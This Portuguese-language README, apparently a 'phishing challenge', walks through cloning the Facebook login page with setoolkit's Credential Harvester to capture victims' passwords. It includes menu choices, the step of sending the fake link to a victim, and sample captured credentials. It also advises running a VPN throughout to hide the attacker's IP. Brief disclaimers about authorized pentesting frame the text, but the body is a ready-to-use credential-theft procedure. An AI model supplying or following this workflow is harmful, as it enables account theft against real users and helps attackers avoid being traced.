# cibersecurity-desafio-phishing
desafio de phising de uma pagina de login 
# Phishing para Captura de Senhas do Facebook (Ambiente Seguro com Máquina Virtual e VPN)

**Aviso Legal**: Este tutorial é apenas para fins educacionais e de teste em ambientes controlados. O uso não autorizado para atividades maliciosas é ilegal e antiético.

---

## 📋 Pré-requisitos
- **Máquina Virtual (VM)**: VirtualBox/VMware com Kali Linux instalado ([Download Kali](https://www.kali.org/get-kali/)).
- **VPN**: Serviço de VPN (ex: ProtonVPN, NordVPN) para anonimizar o tráfego.
- **Ferramentas**:
  - `setoolkit` (já incluso no Kali Linux).
  - `ifconfig` (para verificar o IP local).

---

## 🛠️ Configuração do Ambiente

### 1. **Preparação da Máquina Virtual**
   - Inicie a VM com Kali Linux.
   - **Atualize o sistema**:
     ```bash
     sudo apt update && sudo apt upgrade -y
     ```
   - **Instale uma VPN** (ex: ProtonVPN):
     ```bash
     sudo apt install openvpn
     sudo protonvpn-cli login
     sudo protonvpn-cli connect --fastest
     ```

### 2. **Configuração do `setoolkit` para Phishing**
   - **Acesso root**:
     ```bash
     sudo su
     ```
   - **Inicie o `setoolkit`**:
     ```bash
     setoolkit
     ```
   - **Menu de opções**:
     1. Selecione: **`1) Social-Engineering Attacks`**.
     2. Escolha: **`2) Website Attack Vectors`**.
     3. Método: **`3) Credential Harvester Attack Method`**.
     4. Opção: **`2) Site Cloner`**.

   - **Configuração do clone**:
     - Insira o IP da sua VM (obtido com `ifconfig` ou `ip a`).
     - URL para clonar: **`http://www.facebook.com`**.

---

## 🌐 Execução do Ataque (Simulado)
   - O `setoolkit` criará um servidor local (ex: `http://192.168.1.100`).
   - **Envie o link falso** para a vítima (em ambiente controlado!).
   - Quando a vítima inserir credenciais, os dados serão capturados no terminal:
     ```plaintext
     POSSIBLE USERNAME FIELD FOUND: email-joa0@gmail.com
     POSSIBLE PASSWORD FIELD FOUND: pass-********
     ```

---

## 🔒 Medidas de Segurança Adicionais
- **VPN**: Mantenha a VPN ativada durante todo o processo para ocultar seu IP.
- **Máquina Virtual**: Use snapshots para reverter alterações após o teste.
- **Firewall**: Bloqueie tráfego não autorizado com `ufw`:
  ```bash
<code>  sudo ufw enable
 <code> sudo ufw deny incoming


 📌 Notas Finais
Teste apenas em redes próprias ou com consentimento explícito.

Nunca use esse método para atividades ilegais.




### ⚠️ Aviso Ético
Este material destina-se exclusivamente a **pentesting autorizado** e conscientização sobre segurança cibernética. Violar a privacidade alheia é crime.
